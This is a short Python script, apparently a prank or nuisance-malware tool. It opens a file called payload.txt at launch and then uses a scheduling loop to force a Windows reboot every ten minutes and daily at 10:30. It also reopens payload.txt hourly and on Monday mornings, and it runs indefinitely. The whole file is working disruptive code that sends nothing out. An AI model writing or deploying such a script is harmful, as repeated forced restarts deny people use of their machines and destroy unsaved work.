import os
import schedule
import time

cmd= 'start payload.txt'
os.system(cmd)



def start():
    import os

    cmd= 'shutdown/r'
    os.system(cmd)
    
    
def show():    
    import os
    cmd= 'start payload.txt'
    os.system(cmd)

schedule.every(10).minutes.do(start)
schedule.every().day.at('10:30').do(start)

schedule.every(1).hour.do(show)
schedule.every().monday.at('11:00').do(show)

while 1==1:
    schedule.run_pending()
    time.sleep(1)